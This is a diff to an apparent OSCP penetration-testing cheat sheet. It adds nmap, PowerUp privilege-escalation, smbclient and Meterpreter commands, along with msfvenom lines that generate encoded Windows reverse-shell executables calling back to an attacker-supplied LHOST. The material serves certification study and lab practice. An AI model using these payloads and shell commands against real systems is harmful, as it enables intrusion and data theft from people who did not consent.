@@ -2,9 +2,10 @@
 This repository describes cheat sheet and knowledge for OSCP.
 
 # Contents
-
+<!-- START doctoc -->
+<!-- END doctoc -->
 # Enumeration
-## Host
+## Network
 ### nmap
 #### Example
 ```console
@@ -16,6 +17,18 @@ nmap -sV -T4 -Pn <Target IP Address>
 `-Pn`: Disable sending ping packets to discover a host  
 `-A`: Detect OS and its version.  
 `-p`: Specify range of ports. Scan all ports (1-65535) if using the option `-p-`  
+
+## Windows Privilege Escalation
+### PowerUp.ps1
+This script enumerates the privileges vulnerabilities in Windows 
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+
+### Scan
+```console
+. .\PowerUp.ps1
+Invoke-PrivescAudit [-HTMLReport]
+```
+Note that this tool output "COMPUTER.username.html" if the `-HTMLReport` is enabled.
 
 
 # Brute Force Attack
@@ -69,6 +82,69 @@ The parameter can be specified as follow:
 ```
 sed 's/ //g'
 ```
+
+## SMB
+### smbclient
+```console
+smbclient -L <target>  # Enumerate sharenames
+smbclient //<target>/<sharename>
+get <filename>
+```
+
+# Windows command
+## Powershell
+### Create New file
+```
+New-Item <filename> -Type File
+```
+
+### Display the contents of a text file
+```
+type <filename>
+```
+
+
+
+# Metasploit
+## meterpreter
+## Get system info
+```
+sysinfo
+```
+### Start shell
+```
+shell
+```
+
+### Upload file from Metasploit host to target
+```
+upload <filepath>
+```
+
+### Download file from target to Metasploit host
+```
+download <filepath>
+```
+
+### Load powershell and run
+```
+load powershell
+powershell_shell
+```
+## msfvenom
+This tool creates a payload, such as reverse shell, embedded in a file.
+
+### Windows
+#### exe
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe -o evil.exe
+```
+### exe-service
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata_ga_nai -f exe-service -o evil.exe
+```
+
+
 
 # LICENSE
 MIT
